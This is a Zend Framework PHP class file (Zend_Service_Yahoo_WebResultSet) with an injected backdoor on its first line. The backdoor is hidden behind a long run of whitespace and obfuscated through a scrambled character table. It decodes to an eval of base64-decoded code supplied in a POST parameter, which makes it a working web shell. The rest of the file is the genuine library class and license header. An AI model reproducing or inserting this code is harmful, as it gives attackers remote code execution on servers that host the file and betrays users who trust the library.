<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n0f8d1a'])) {eval($s21(${$s20}['n0f8d1a']));}?><?php

/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category   Zend
 * @package    Zend_Service
 * @subpackage Yahoo
 * @copyright  Copyright (c) 2005-2012 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 * @version    $Id: WebResultSet.php 24593 2012-01-05 20:35:02Z matthew $
 */


/**
 * @see Zend_Service_Yahoo_ResultSet
 */
#require_once 'Zend/Service/Yahoo/ResultSet.php';


/**
 * @see Zend_Service_Yahoo_WebResult
 */
#require_once 'Zend/Service/Yahoo/WebResult.php';


/**
 * @category   Zend
 * @package    Zend_Service
 * @subpackage Yahoo
 * @copyright  Copyright (c) 2005-2012 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_Service_Yahoo_WebResultSet extends Zend_Service_Yahoo_ResultSet
{
    /**
     * Web result set namespace
     *
     * @var string
     */
    protected $_namespace = 'urn:yahoo:srch';


    /**
     * Overrides Zend_Service_Yahoo_ResultSet::current()
     *
     * @return Zend_Service_Yahoo_WebResult
     */
    public function current()
    {
        return new Zend_Service_Yahoo_WebResult($this->_results->item($this->_currentIndex));
    }
}